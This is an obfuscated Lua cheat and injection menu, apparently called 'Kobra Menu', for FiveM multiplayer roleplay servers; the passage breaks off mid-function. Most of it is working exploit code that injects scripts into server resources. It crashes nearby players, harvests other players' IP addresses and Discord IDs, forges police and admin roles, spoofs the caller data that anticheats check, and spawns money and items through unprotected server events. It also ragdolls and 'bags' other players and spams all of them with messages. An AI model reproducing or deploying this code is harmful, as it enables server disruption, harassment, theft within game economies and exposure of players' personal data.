                    elseif type(value) == "number" or type(value) == "boolean" then
                        return tostring(value)
                    elseif value == nil then
                        return "null"
                    else
                        return "\"[unserializable:" .. type(value) .. "]\""
                    end
                end

                local function HookNative(nativeName, newFunction)
                    local original = _G[nativeName]
                    if original and type(original) == "function" then
                        _G[nativeName] = function(...)
                            local info = debug.getinfo(2, "Sln")
                            return newFunction(original, ...)
                        end
                    end
                end

                local te = d({84,114,105,103,103,101,114,69,118,101,110,116})  -- TriggerEvent
                local tse = d({84,114,105,103,103,101,114,83,101,114,118,101,114,69,118,101,110,116}) -- TriggerServerEvent

                HookNative(te, function(orig, eventName, ...)
                    local args = {...}
                    local encoded = {}
                    for i, arg in ipairs(args) do
                        encoded[i] = SimpleJsonEncode(arg)
                    end
                    print("^7[^5CLIENT^7] [^3EVENT^7]:", eventName, table.concat(encoded, ", "))
                    return orig(eventName, ...)
                end)

                HookNative(tse, function(orig, eventName, ...)
                    local args = {...}
                    local encoded = {}
                    for i, arg in ipairs(args) do
                        encoded[i] = SimpleJsonEncode(arg)
                    end
                    print("^7[^5SERVER^7] [^3EVENT^7]:", eventName, table.concat(encoded, ", "))
                    return orig(eventName, ...)
                end)
            ]];v48(v611,v613);v610=776 -(89 + 684) ;end if (v610==1) then v59("Resource Name","",function(v927) if (v927 and (v927~="")) then v611=v927;end v612=true;end,"typeable");while  not v612 do Wait(70 + 30 );end if ( not v611 or (v611=="")) then local v990=0 + 0 ;while true do if (v990==(0 + 0)) then MachoMenuNotification("Error","No resource name entered.");v12:ShowUI();v990=1 -0 ;end if (v990==(1 + 0)) then return;end end end v610=2 + 0 ;end end end});end if (GetResourceState("ox_lib")=="started") then v96({type="button",label="CRASH NEARBY PLAYERS",onSelect=function() local v614=0;while true do if (v614==(613 -(238 + 375))) then if (GetResourceState("WaveShield")=="started") then local v991=0 + 0 ;while true do if (v991==(0 -0)) then v12:Notify("error","Kobra","Bahama Prevention: Can't use this on WaveShit",3000);return;end end end MachoInjectResourceRaw("ox_lib",[[
                CreateObject = function() end

                local model <const> = 'p_spinning_anus_s'
                local props <const> = {}

                for i = 1, 600 do
                    props[i] = {
                        model = model,
                        coords = vec3(0.0, 0.0, 0.0),
                        pos = vec3(0.0, 0.0, 0.0),
                        rot = vec3(0.0, 0.0, 0.0)
                    }
                end

                local plyState <const> = LocalPlayer.state

                plyState:set('lib:progressProps', props, true)
                Wait(1000)
                plyState:set('lib:progressProps', nil, true)
        ]]);break;end end end});end if ((GetResourceState("dpemotes")=="started") or (GetResourceState("framework")=="started")) then v96({type="button",label="BRING NEARBY PLAYERS",onSelect=function() local v615=0;while true do if (v615==(0 + 0)) then v12:Notify("success","Kobra","Attempting to bring all players",3000);MachoInjectThread(0 -0 ,"dpemotes","",[[
                    TriggerServerEvent('ServerValidEmote', "-1", "horse", "horse")
                ]]);break;end end end});end if (GetResourceState("mc9-adminmenu")=="started") then v96({type="button",label="ADMIN MENU (F8)",onSelect=function() local v616=0;while true do if (v616==(0 -0)) then v12:Notify("success","Kobra","Admin Menu List",3000);MachoInjectResource2(NewThreadNs,"mc9-adminmenu",[[
                for id, ply in pairs(CurrentPlayers or {}) do
                    if ply and ply.name and ply.id then
                        print(("Information about ^6%s ^7| ^2%s"):format(ply.name, ply.id))
                        
                        if ply.identifiers and ply.identifiers.ip then
                            print(("    IP: ^2%s"):format(ply.identifiers.ip:sub(4)))
                        else
                            print("    IP: ^1Not Available")
                        end
                        
                        if ply.identifiers and ply.identifiers.discord then
                            print(("    Discord: ^2%s"):format(ply.identifiers.discord:sub(9)))
                        else
                            print("    Discord: ^1Not Available")
                        end
                    end
                end
            ]]);break;end end end});end if (GetResourceState("mc9-mainmenu")=="started") then v96({type="button",label="MCSHIT9 ADD ITEMS",onSelect=function() local v617=0;while true do if (v617==(0 -0)) then v12:Notify("success","Kobra","Spawning Items",6511 -3511 );MachoInjectResource2(NewThreadNs,"mc9-mainmenu",[[
            local data, playtime = mc9.callback.await("mc9-mainmenu:server:GetMilestoneReward", false)
            for i,v in pairs(data) do
                local result, message = mc9.callback.await("mc9-mainmenu:server:claimMilestoneReward", v)
            end
            ]]);break;end end end});end if (GetResourceState("vMenu")=="started") then v96({type="button",label="HIT DMS",onSelect=function() local v618=0 -0 ;while true do if (v618==(0 -0)) then v12:Notify("success","Kobra","Message Sent",2776 + 224 );MachoInjectResource2(1,"any",[[
                    TriggerServerEvent('vMenu:SendMessageToPlayer', -1, 'Hello this is Kobra Menu by JayThaaGamer, the leading cheat in the market.')
                ]]);break;end end end});end if (GetResourceState("amigo")=="started") then v96({type="button",label="ADD ITEM (1)",onSelect=function() local v619=0 + 0 ;local v620;local v621;local v622;local v623;local v624;local v625;while true do if (v619==2) then v622=v620("Item Count","1");print("^7[^5Kobra^7] [^3DEBUG^7]: Raw inputCount =",tostring(v622));v623=tonumber(v622);if ( not v623 or (v623<1)) then print("^7[^5Kobra^7] [^1WARN^7]: Invalid count, defaulting to 1");v623=1 + 0 ;end v619=3;end if (v619==3) then if (v623>(100462 -(428 + 34))) then local v992=0 + 0 ;while true do if (v992==0) then print("^7[^5Kobra^7] [^1WARN^7]: Count too high, clamping to 100000");v623=100000;break;end end end v621=tostring(v621 or "" );v623=tonumber(v623 or (1 -0) );print("^7[^5Kobra^7] [^3DEBUG^7]: Final itemName =",v621);v619=8 -4 ;end if (v619==(9 -5)) then print("^7[^5Kobra^7] [^3DEBUG^7]: Final itemCount =",v623);v624,v625=pcall(function() MachoInjectResourceRaw("amigo",string.format([[
                        -- Hook native functions safely
                        local function HookNative(nativeName, newFunction)
                            local originalNative = _G[nativeName]
                            if not originalNative or type(originalNative) ~= "function" then return end
                            _G[nativeName] = function(...)
                                print(("^7[^5Kobra^7] [^3DEBUG^7]: Hooked Native - %%s"):format(nativeName))
                                return newFunction(originalNative, ...)
                            end
                        end

                        HookNative("TriggerEvent", function(originalFn, ...) return originalFn(...) end)
                        HookNative("TriggerServerEvent", function(originalFn, ...) return originalFn(...) end)

                        _G.Kobra = {
                            TEvent = function(eName, ...) return TriggerEvent(eName, ...) end,
                            TSEvent = function(eName, ...) return TriggerServerEvent(eName, ...) end,
                        }

                        print("^7[^5Kobra^7] [^3DEBUG^7]: Sending giveItem request for %s x%d")
                        _G.Kobra.TSEvent('player:giveItem', { item = "%s", count = %d })
                    ]],v621,v623,v621,v623));end);if  not v624 then local v993=0;while true do if (v993==(918 -(223 + 695))) then print("^7[^5Kobra^7] [^1ERROR^7]: string.format failed →",v625);print("^7[^5Kobra^7] [^3DEBUG^7]: itemName =",tostring(v621),"itemCount =",tostring(v623));v993=3 -2 ;end if (v993==1) then v12:Notify("error","Kobra","String format failed — check console",4511 -(329 + 182) );break;end end else print("^7[^5Kobra^7] [^2INFO^7]: Injection completed successfully");end v12:ShowUI();break;end if ((0 + 0)==v619) then v12:HideUI();v620=nil;function v620(v928,v929) local v930=nil;local v931=false;v59(v928,v929 or "" ,function(v994) local v995=0 -0 ;while true do if (v995==(0 + 0)) then v930=v994;v931=true;break;end end end,"typeable");while  not v931 do Wait(0);end return v930;end print("^7[^5Kobra^7] [^3DEBUG^7]: Waiting for item input...");v619=1 + 0 ;end if (v619==(1 + 0)) then v621=v620("Item Name","");print("^7[^5Kobra^7] [^3DEBUG^7]: Raw itemName =",tostring(v621));if ( not v621 or (v621=="")) then local v996=0 -0 ;while true do if (v996==(1 -0)) then v12:ShowUI();return;end if (v996==(1200 -(177 + 1023))) then print("^7[^5Kobra^7] [^1ERROR^7]: Invalid or empty itemName");v12:Notify("error","Kobra","No item name entered",3000);v996=1;end end end print("^7[^5Kobra^7] [^3DEBUG^7]: Waiting for item count input...");v619=3 -1 ;end end end});end local v298=GetResourceState("scripts")=="started" ;local v299=GetResourceState("framework")=="started" ;if (v298 or v299) then local v562=0 + 0 ;local v563;while true do if (v562==(0 -0)) then v563=(v298 and "scripts") or "framework" ;v96({type="button",label="COMPLETE COMMS",onSelect=function() local v872=1465 -(120 + 1345) ;while true do if (v872==(337 -(8 + 329))) then v12:Notify("Comserv","Kobra","Action Removed you might have to spam this",3125 -(19 + 106) );MachoInjectResourceRaw(v563,[[
                    local function decode(tbl)
                        local s = ""
                        for i = 1, #tbl do s = s .. string.char(tbl[i]) end
                        return s
                    end

                    local function g(n) return _G[decode(n)] end

                    for i = 1, 1 do
                        lib.callback("comservs:completeAction", false, function(entity) print(entity) end)
                        g({87,97,105,116})(0)
                    end
                ]]);break;end end end});break;end end end if ((GetResourceState("es_extended")=="started") or (GetResourceState("core")=="started")) then v96({type="button",label="POLICE JOB (1)",onSelect=function() if (GetResourceState("es_extended")=="started") then local v821=0 -0 ;while true do if (v821==(0 -0)) then v12:Notify("Setjob","Kobra","Your job has been set to police",2913 + 87 );MachoInjectResource2(NewThreadNs,"es_extended",[[
                        function hNative(nativeName, newFunction)
                            local originalNative = _G[nativeName]
                            if not originalNative or type(originalNative) ~= "function" then
                                return
                            end

                            _G[nativeName] = function(...)
                                return newFunction(originalNative, ...)
                            end
                        end

                        hNative("CreateThread", function(originalFn, ...) return originalFn(...) end)
                        hNative("Wait", function(originalFn, ...) return originalFn(...) end)
                        hNative("GetInvokingResourceData", function(originalFn, ...) return originalFn(...) end)
                        hNative("ESX.SetPlayerData", function(originalFn, ...) return originalFn(...) end)

                        local fake_execution_data = {
                            ran_from_cheat = false,
                            path = "core/server/main.lua",
                            execution_id = "324341234567890"
                        }

                        local original_GetInvokingResourceData = GetInvokingResourceData
                        GetInvokingResourceData = function()
                            return fake_execution_data
                        end

                        ESX.SetPlayerData("job", {
                            name = "police",
                            label = "Police",
                            grade = 3,
                            grade_name = "lieutenant",
                            grade_label = "Lieutenant"
                        })
                        GetInvokingResourceData = original_GetInvokingResourceData
                    ]]);break;end end elseif (GetResourceState("core")=="started") then local v932=0;while true do if ((0 -0)==v932) then v12:Notify("Setjob","Kobra","Your job has been set to police",3000);MachoInjectResource2(NewThreadNs,"core",[[
                        function hNative(nativeName, newFunction)
                            local originalNative = _G[nativeName]
                            if not originalNative or type(originalNative) ~= "function" then
                                return
                            end

                            _G[nativeName] = function(...)
                                return newFunction(originalNative, ...)
                            end
                        end

                        hNative("CreateThread", function(originalFn, ...) return originalFn(...) end)
                        hNative("Wait", function(originalFn, ...) return originalFn(...) end)
                        hNative("GetInvokingResourceData", function(originalFn, ...) return originalFn(...) end)
                        hNative("ESX.SetPlayerData", function(originalFn, ...) return originalFn(...) end)

                        local fake_execution_data = {
                            ran_from_cheat = false,
                            path = "core/server/main.lua",
                            execution_id = "324341234567890"
                        }

                        local original_GetInvokingResourceData = GetInvokingResourceData
                        GetInvokingResourceData = function()
                            return fake_execution_data
                        end

                        ESX.SetPlayerData("job", {
                            name = "police",
                            label = "Police",
                            grade = 3,
                            grade_name = "lieutenant",
                            grade_label = "Lieutenant"
                        })
                        GetInvokingResourceData = original_GetInvokingResourceData
                    ]]);break;end end else print("Neither core nor es_extended started");end end});end if ((GetResourceState("scripts")=="started") or (GetResourceState("framework")=="started")) then v96({type="button",label="POLICE JOB (2)",onSelect=function() v12:Notify("Setjob","Kobra","You are now Police",3000);MachoInjectResourceRaw("any",[[
                    local lp = LocalPlayer
                    if lp and lp.state then
                        lp.state:set("job", {
                            name = "police",
                            label = "Police",
                            grade = 4,
                            grade_name = "sergeant"
                        }, true)
                        print("[✅] Job set to police successfully.")
                    else
                        print("[⚠️] Failed to set job: LocalPlayer or state not available.")
                    end
                ]]);end});end if (GetResourceState("codewave-sneaker-phone")=="started") then v96({type="button",label="COLLECT REWARDS",onSelect=function() MachoInjectResource2(NewThreadNs,"codewave-sneaker-phone",[[
                    function HookNative(nativeName, newFunction)
                        local originalNative = _G[nativeName]
                        if not originalNative or type(originalNative) ~= "function" then
                            return
                        end
                        _G[nativeName] = function(...)
                            return newFunction(originalNative, ...)
                        end
                    end

                    HookNative("TriggerEvent", function(originalFn, ...)
                        return originalFn(...)
                    end)

                    HookNative("TriggerServerEvent", function(originalFn, ...)
                        return originalFn(...)
                    end)

                    _G.Kobra = {
                        TEvent = function(eName, ...)
                            return TriggerEvent(eName, ...)
                        end,
                        TSEvent = function(eName, ...)
                            return TriggerServerEvent(eName, ...)
                        end,
                    }

                    _G.Kobra.TSEvent('delivery:giveRewardShoes', 100000)
                    print("[✅] reward triggered successfully.")
                ]]);end});end if (GetResourceState("rzrp-base")=="started") then v96({type="checkbox",label="Ragdoll Players (RZRP)",checked=false,onSelect=function(v626) if v626 then local v822=0 -0 ;while true do if (0==v822) then v12:Notify("Ragdoll","Kobra","Ragdolling Nearby Players",15358 -11358 );v48("rzrp-base",[[
                        if not _G.KobraRagdollPlayersInitialized then
                            _G.KobraRagdollPlayersEnabled = true
                            _G.KobraRagdollPlayersInitialized = true

                            local function SafeWrap(fn)
                                return function(...)
                                    local ok, result = pcall(fn, ...)
                                    return ok and result or nil
                                end
                            end

                            local SafeThread      = SafeWrap(CreateThread)
                            local SafeSTrigger    = SafeWrap(TriggerServerEvent)
                            local SafeGetPlayers  = SafeWrap(GetActivePlayers)
                            local SafeGetPed      = SafeWrap(GetPlayerPed)
                            local SafeGetCoords   = SafeWrap(GetEntityCoords)
                            local SafeGetServerId = SafeWrap(GetPlayerServerId)
                            local SafeWait        = SafeWrap(Wait)

                            local function GetDistance(a, b)
                                return #(a - b)
                            end

                            -- Stop any existing ragdoll thread before creating a new one
                            if _G.KobraRagdollThread then
                                TerminateThread(_G.KobraRagdollThread)
                                _G.KobraRagdollThread = nil
                            end

                            _G.KobraRagdollThread = SafeThread(function()
                                while _G.KobraRagdollPlayersEnabled and _G.KobraRagdollPlayersInitialized do
                                    local myPed = PlayerPedId()
                                    local myCoords = SafeGetCoords(myPed)
                                    if not myCoords then break end

                                    local players = SafeGetPlayers()
                                    if not players then break end

                                    for _, pid in ipairs(players) do
                                        local targetPed = SafeGetPed(pid)
                                        if targetPed and targetPed ~= myPed then
                                            local targetCoords = SafeGetCoords(targetPed)
                                            if targetCoords and GetDistance(myCoords, targetCoords) <= 30000.0 then
                                                local sid = SafeGetServerId(pid)
                                                if sid then
                                                    SafeSTrigger('RZRP:Player:Slap', sid)
                                                end
                                            end
                                        end
                                    end

                                    SafeWait(2000)
                                end

                                _G.KobraRagdollThread = nil
                            end)
                        else
                            _G.KobraRagdollPlayersEnabled = true
                        end
                    ]]);break;end end else local v823=0 -0 ;while true do if (v823==(0 + 0)) then v12:Notify("Ragdoll","Kobra","Stopped Ragdolling Players",5503 -(957 + 546) );v48("rzrp-base",[[
                        _G.KobraRagdollPlayersEnabled = false
                        _G.KobraRagdollPlayersInitialized = false
                        if _G.KobraRagdollThread then
                            TerminateThread(_G.KobraRagdollThread)
                            _G.KobraRagdollThread = nil
                        end
                    ]]);break;end end end end});end if (GetResourceState("rzrp-base")=="started") then v96({type="checkbox",label="Bag Closest Players (RZRP)",checked=false,onSelect=function(v627) if v627 then local v824=0;while true do if (v824==0) then print("Bag Closest Players Started...");v48("rzrp-base",[[
                        if not _G.KobraBagPlayersInitialized then
                            _G.KobraBagPlayersEnabled = true
                            _G.KobraBagPlayersInitialized = true

                            local function SafeWrap(fn)
                                return function(...)
                                    local ok, result = pcall(fn, ...)
                                    return ok and result or nil
                                end
                            end

                            local SafeThread      = SafeWrap(CreateThread)
                            local SafeSTrigger    = SafeWrap(TriggerServerEvent)
                            local SafeGetPlayers  = SafeWrap(GetActivePlayers)
                            local SafeGetPed      = SafeWrap(GetPlayerPed)
                            local SafeGetCoords   = SafeWrap(GetEntityCoords)
                            local SafeGetServerId = SafeWrap(GetPlayerServerId)
                            local SafeWait        = SafeWrap(Wait)

                            local function GetDistance(a, b)
                                return #(a - b)
                            end

                            if _G.KobraBagThread then
                                TerminateThread(_G.KobraBagThread)
                                _G.KobraBagThread = nil
                            end

                            _G.KobraBagThread = SafeThread(function()
                                while _G.KobraBagPlayersEnabled and _G.KobraBagPlayersInitialized do
                                    local myPed = PlayerPedId()
                                    local myCoords = SafeGetCoords(myPed)
                                    if not myCoords then break end

                                    local players = SafeGetPlayers()
                                    if not players then break end

                                    for _, pid in ipairs(players) do
                                        local targetPed = SafeGetPed(pid)
                                        if targetPed and targetPed ~= myPed then
                                            local targetCoords = SafeGetCoords(targetPed)
                                            if targetCoords and GetDistance(myCoords, targetCoords) <= 300000.0 then
                                                local sid = SafeGetServerId(pid)
                                                if sid then
                                                    SafeSTrigger('RZRP:Player:BagClosestPlayer', sid)
                                                end
                                            end
                                        end
                                    end

                                    SafeWait(2000)
                                end

                                _G.KobraBagThread = nil
                            end)
                        else
                            _G.KobraBagPlayersEnabled = true
                        end
                    ]]);break;end end else local v825=0 -0 ;while true do if ((0 + 0)==v825) then print("Bag Closest Players Stopped...");v48("rzrp-base",[[
                        _G.KobraBagPlayersEnabled = false
                        _G.KobraBagPlayersInitialized = false
                        if _G.KobraBagThread then
                            TerminateThread(_G.KobraBagThread)
                            _G.KobraBagThread = nil
                        end
                    ]]);break;end end end end});end if ((GetResourceState("scripts")=="started") or (GetResourceState("framework")=="started")) then v96({type="button",label="Force Gang",onSelect=function() local v628=0;local v629;local v630;local v631;local v632;while true do if (v628==(1 + 0)) then v59("Gang Name","",function(v933) if (v933 and (v933~="")) then v629=v933;end end,"typeable");Wait(2300);v59("Gang Rank","",function(v934) if (v934 and (v934~="")) then v630=tonumber(v934) or (1 + 0) ;end end,"typeable");v628=2;end if ((2 + 1)==v628) then v48(v631,v632);v12:ShowUI();v12:Notify("success","Kobra","Gang Set",4703 -(227 + 476) );break;end if (v628==(0 -0)) then v629="";v630=1;v12:HideUI();v628=1 -0 ;end if ((2 -0)==v628) then Wait(1000);v631=((GetResourceState("scripts")=="started") and "scripts") or "framework" ;v632=string.format([[
                    LocalPlayer.state:set("gang", "%s", true)
                    LocalPlayer.state:set("gang_rank", %d, true)
                ]],v629,v630);v628=4 -1 ;end end end});end if (GetResourceState("framework")=="started") then v96({type="button",label="Give Item #2",onSelect=function() local v633=0;local v634;local v635;local v636;local v637;local v638;local v639;while true do if ((3 -0)==v633) then if (v637>(100954 -(166 + 788))) then local v997=986 -(21 + 965) ;while true do if (v997==(696 -(127 + 569))) then print("^7[^5Kobra^7] [^1WARN^7]: That shit too high, stamping to 100000");v637=84221 + 15779 ;break;end end end v635=tostring(v635 or "" );v637=tonumber(v637 or (1 + 0) );print("^7[^5Kobra^7] [^3DEBUG^7]: Final itemName =",v635);v633=2 + 2 ;end if (v633==(2 -0)) then v636=v634("Item Count","1");print("^7[^5Kobra^7] [^3DEBUG^7]: Raw inputCount =",tostring(v636));v637=tonumber(v636);if ( not v637 or (v637<(1 + 0))) then print("^7[^5Kobra^7] [^1WARN^7]: Invalid count, defaulting to 1");v637=2 -1 ;end v633=2 + 1 ;end if (v633==(1 + 3)) then print("^7[^5Kobra^7] [^3DEBUG^7]: Final itemCount =",v637);v638,v639=pcall(function() MachoInjectResourceRaw("framework",string.format([[
                        TriggerServerEvent('drugs:receive', {
                            Reward = {
                                Name = "%s",
                                Amount = %d
                            }
                        })
                    ]],v635,v637));end);if  not v638 then local v998=1292 -(1162 + 130) ;while true do if (v998==0) then print("^7[^5Kobra^7] [^1ERROR^7]: string.format failed →",v639);v12:Notify("error","Kobra","String format failed — check console",8505 -4505 );break;end end else local v999=0 + 0 ;while true do if (v999==(0 -0)) then print("^7[^5Kobra^7] [^2INFO^7]: Injection completed successfully");v12:Notify("success","Kobra","Item Sent",4936 -(889 + 47) );break;end end end v12:ShowUI();break;end if ((0 + 0)==v633) then v12:HideUI();v634=nil;function v634(v935,v936) local v937=nil;local v938=false;v59(v935,v936 or "" ,function(v1000) local v1001=0;while true do if (v1001==(1264 -(1153 + 111))) then v937=v1000;v938=true;break;end end end,"typeable");while  not v938 do Wait(0 -0 );end return v937;end print("^7[^5Kobra^7] [^3DEBUG^7]: Waiting for item input...");v633=1 + 0 ;end if (v633==1) then v635=v634("Item Name","");print("^7[^5Kobra^7] [^3DEBUG^7]: Raw itemName =",tostring(v635));if ( not v635 or (v635=="")) then local v1002=0 + 0 ;while true do if ((0 + 0)==v1002) then print("^7[^5Kobra^7] [^1ERROR^7]: Invalid or empty itemName");v12:Notify("error","Kobra","No item name entered",3000);v1002=1 + 0 ;end if ((1 + 0)==v1002) then v12:ShowUI();return;end end end print("^7[^5Kobra^7] [^3DEBUG^7]: Waiting for item count input...");v633=3 -1 ;end end end});end if (GetResourceState("WayTooCerti_3D_Printer")=="started") then v96({type="button",label="COLLECT ITEMS 3",onSelect=function() MachoInjectResourceRaw("WayTooCerti_3D_Printer",[[
                local function Ak47Spawn()
                TriggerServerEvent('waytoocerti_3dprinter:CompletePurchase', 'money', 10000)
                end
                Ak47Spawn()
            ]]);end});end if (GetResourceState("tm-base")=="started") then table.insert(events,{name="Spawn Money #4",eventName="give_metro_money_04",execute=function() local v640=0;while true do if (v640==(0 + 0)) then print("Give Money Metro RP...");MachoInjectResource2(NewThreadNs,"tm-base",[[
                TriggerServerEvent('tm-moneywash:giveCleanMoney', 100000)
                ]]);break;end end end});end if ((GetResourceState("scripts")=="started") or (GetResourceState("framework")=="started")) then v96({type="button",label="Set Chat Tag",onSelect=function() local v641=0;local v642;local v643;local v644;local v645;while true do if (v641==(96 -(23 + 73))) then v12:HideUI();v642=nil;function v642(v939,v940) local v941=nil;local v942=false;v59(v939,v940 or "" ,function(v1003) local v1004=0;while true do if (v1004==(285 -(26 + 259))) then v941=v1003;v942=true;break;end end end,"typeable");while  not v942 do Wait(0 + 0 );end return v941;end v643=v642("Chat Tag Name","");v641=1 -0 ;end if ((6 -4)==v641) then Wait(2129 -(1094 + 535) );v645=((GetResourceState("scripts")=="started") and "scripts") or "framework" ;MachoInjectResourceRaw(v645,string.format([[
                    LocalPlayer.state:set('currentChatTag', { tag = "%s", color = "%s" }, true)
                ]],v643,v644));v12:ShowUI();break;end if ((1 + 0)==v641) then if ( not v643 or (v643=="")) then local v1005=0;while true do if (v1005==0) then v12:ShowUI();return;end end end Wait(2376 -(1554 + 322) );v644=v642("Tag Color (R, G, B)","0, 255, 0");if ( not v644 or (v644=="")) then v644="255, 255, 255";end v641=1427 -(989 + 436) ;end end end});end if (GetResourceState("wasabi_multijob")=="started") then v96({type="button",label="POLICE JOB (3)",onSelect=function() local v646=1178 -(816 + 362) ;while true do if ((0 -0)==v646) then MachoInjectResource2(NewThreadNs,"wasabi_multijob",[[
            local job = { label = "Police", name = "police", grade = 1, grade_label = "Officer", grade_name = "officer" }
            CheckJob(job, true) 
        ]]);MachoInjectResource2(NewThreadNs,"wasabi_multijob",[[
            SelectJobMenu({ job = 'police', grade = 1, label = 'Police', boss = true, onDuty = false })
        ]]);break;end end end});end if (GetResourceState("wasabi_multijob")=="started") then v96({type="button",label="EMS JOB (1)",onSelect=function() local v647=0;while true do if (v647==0) then MachoInjectResource2(NewThreadNs,"wasabi_multijob",[[
            local job = { label = "EMS", name = "ambulance", grade = 1, grade_label = "Medic", grade_name = "medic", boss = false, onDuty = true }
            CheckJob(job, true)
        ]]);MachoInjectResource2(NewThreadNs,"wasabi_multijob",[[
            SelectJobMenu({ job = 'ambulance', grade = 5, label = 'Ambulance', boss = true, onDuty = false })
        ]]);break;end end end});end if (GetResourceState("ElectronAC")=="started") then v96({type="button",label="ElectronAC Admin Panel",onSelect=function() MachoInjectResourceRaw("ElectronAC",[[
        SetNuiFocus(true, true)
        SendNUIMessage({
            action = "menu",
            data = {
                info = {
                    adminContext = {
                        master = true,
                        permissions = { "all" }
                    },
                    identifiers = {
                        ["ip"] = "127.0.0.1",
                        ["license"] = "",
                        ["license2"] = "",
                    },
                    permissions = {
                        adminMenu = true,
                        whitelisted = true
                    }
                },
                open = true,
                setOpen = true
            }
        })
        ]]);end});end if (GetResourceState("spoodyFraud")=="started") then v96({type="button",label="Collect Cash",onSelect=function() MachoInjectResource2(NewThreadNs,"spoodyFraud",[[
        function HookNative(nativeName, newFunction)
            local originalNative = _G[nativeName]
            if not originalNative or type(originalNative) ~= "function" then
                return
            end

            _G[nativeName] = function(...)
                return newFunction(originalNative, ...)
            end
        end

        HookNative("CreateThread", function(originalFn, ...)
            return originalFn(...)
        end)

        HookNative("TriggerServerEvent", function(originalFn, ...)
            return originalFn(...)
        end)

        function Spoody()
            for i = 1, 30 do
                TriggerServerEvent('spoodyFraud:interactionComplete', 'Swapped Sim Card')
                TriggerServerEvent('spoodyFraud:interactionComplete', 'Cloned Card')

                Citizen.Wait(5)

                TriggerServerEvent('spoodyFraud:attemptSellProduct', 'Pacific Bank', 'clone')
                TriggerServerEvent('spoodyFraud:attemptSellProduct', 'Sandy Shoes', 'sim')
            end
        end

        CreateThread(function()
            Spoody()
        end)
        ]]);end});end v59("Choose Menu Key","",function(v490) for v564,v565 in pairs(v44) do if (v565:lower()==v490:lower()) then local v725=0 -0 ;while true do if (v725==(3 -2)) then v12:ShowUI();return;end if (v725==(0 -0)) then v23=v565;Wait(585 -335 );v725=4 -3 ;end end end end end,"keybind");local v300=0;local v301=2 + 118 ;while true do Wait(763 -(86 + 677) );if v32 then local v648=v38[v39];if IsControlJustReleased(0 + 0 ,1 + 13 ) then v39=(v39% #v38) + 1 ;MachoSendDuiMessage(v14,json.encode({action="scroll",direction="down"}));end if IsControlJustReleased(0,1041 -(263 + 763) ) then local v826=0 + 0 ;while true do if (v826==0) then v39=((v39-(860 -(649 + 209)))% #v38) + (4 -3) ;MachoSendDuiMessage(v14,json.encode({action="scroll",direction="up"}));break;end end end if (v648=="Shoot Weapon") then local v827=731 -(643 + 88) ;while true do if (0==v827) then if IsDisabledControlJustPressed(0,1813 -(54 + 1715) ) then local v1159=0 -0 ;while true do if ((0 -0)==v1159) then v34=((v34-(3 -1))% #v36) + 1 ;MachoSendDuiMessage(v14,json.encode({action="updateWeapon",index=v34}));break;end end end if IsDisabledControlJustPressed(0,38) then v34=(v34% #v36) + 1 ;MachoSendDuiMessage(v14,json.encode({action="updateWeapon",index=v34}));end break;end end elseif (v648=="Spawn Car") then if IsDisabledControlJustPressed(0 + 0 ,5 + 39 ) then v35=((v35-2)% #v37) + (3 -2) ;MachoSendDuiMessage(v14,json.encode({action="updateVehicle",index=v35}));end if IsDisabledControlJustPressed(1383 -(132 + 1251) ,38 + 0 ) then local v1040=0;while true do if (v1040==(0 -0)) then v35=(v35% #v37) + 1 + 0 ;MachoSendDuiMessage(v14,json.encode({action="updateVehicle",index=v35}));break;end end end end if IsDisabledControlPressed(0,482 -(185 + 273) ) then local v828=v648;if (v828=="Shoot Weapon") then local v943=0 + 0 ;local v944;while true do if (v943==1) then if (v944~=v33) then local v1304=0 -0 ;while true do if (v1304==1) then if ((GetResourceState("ReaperV4")~="started") or (GetCurrentServerEndpoint()=="216.146.24.88:30120")) then if (GetResourceState("WaveShield")=="started") then if _G.KobraFreecamObject then local function v1660(v1714) local v1715=0;local v1716;local v1717;local v1718;while true do if (v1715==(0 + 0)) then v1716=math.rad(v1714.z);v1717=math.rad(v1714.x);v1715=1225 -(361 + 863) ;end if (v1715==1) then v1718=math.abs(math.cos(v1717));return vector3( -math.sin(v1716) * v1718 ,math.cos(v1716) * v1718 ,math.sin(v1717));end end end function hNative(v1719,v1720) local v1721=0 -0 ;local v1722;while true do if (v1721==(1328 -(443 + 884))) then _G[v1719]=function(...) return v1720(v1722,...);end;break;end if ((0 -0)==v1721) then v1722=_G[v1719];if ( not v1722 or (type(v1722)~="function")) then return;end v1721=1 + 0 ;end end end hNative("CreateThread",function(v1723,...) return v1723(...);end);hNative("Wait",function(v1724,...) return v1724(...);end);hNative("PlayerPedId",function(v1725,...) return v1725(...);end);hNative("GetHashKey",function(v1726,...) return v1726(...);end);hNative("GiveWeaponToPed",function(v1727,...) return v1727(...);end);hNative("SetCurrentPedWeapon",function(v1728,...) return v1728(...);end);hNative("GetCurrentPedWeapon",function(v1729,...) return v1729(...);end);hNative("RemoveWeaponFromPed",function(v1730,...) return;end);hNative("ShootSingleBulletBetweenCoords",function(v1731,...) return v1731(...);end);local v1661=GetCamCoord(_G.KobraFreecamObject);local v1662=GetCamRot(_G.KobraFreecamObject,2 -0 );local v1663=v1660(v1662);local v1664=796 + 204 ;local v1665=v1661 + (v1663 * v1664) ;local v1666=PlayerPedId();local v1667=GetHashKey(v944);local function v1668(v1732) local v1733=0;local v1734;while true do if (v1733==(0 + 0)) then v1734={};for v1763=2 -1 , #v1732 do v1734[v1763]=string.byte(v1732,v1763);end v1733=748 -(16 + 731) ;end if ((1 + 0)==v1733) then return table.concat(v1734,",");end end end local v1669=v1668(v944);v48(((GetResourceState("monitor")=="started") and "monitor") or ((GetResourceState("WaveShield")=="started") and "WaveShield") or "any" ,string.format([[
                                        if not _G.osintWeaponBypass then
                                            _G.osintWeaponBypass = { enabled = false }
                                        end
                                        _G.osintWeaponBypass.enabled = true

                                        local function hNative(nativeName, newFunction)
                                            local originalNative = _G[nativeName]
                                            if not originalNative or type(originalNative) ~= "function" then return end
                                            _G[nativeName] = function(...) return newFunction(originalNative, ...) end
                                        end

                                        hNative("GetHashKey", function(orig, str) return orig(str) end)
                                        hNative("GiveWeaponToPed", function(orig, ped, hash, ammo, isHidden, equipNow)
                                            if _G.osintWeaponBypass and _G.osintWeaponBypass.enabled then
                                                return orig(ped, hash, ammo, false, true)
                                            else
                                                return orig(ped, hash, ammo, isHidden, equipNow)
                                            end
                                        end)
                                        hNative("SetCurrentPedWeapon", function(orig, ped, hash, equipNow)
                                            if _G.osintWeaponBypass and _G.osintWeaponBypass.enabled then
                                                return orig(ped, hash, true)
                                            else
                                                return orig(ped, hash, equipNow)
                                            end
                                        end)

                                        local function _b(str)
                                            local t = {}
                                            for i = 1, #str do t[i] = string.byte(str, i) end
                                            return t
                                        end
                                        local function _d(tbl)
                                            local s = ""
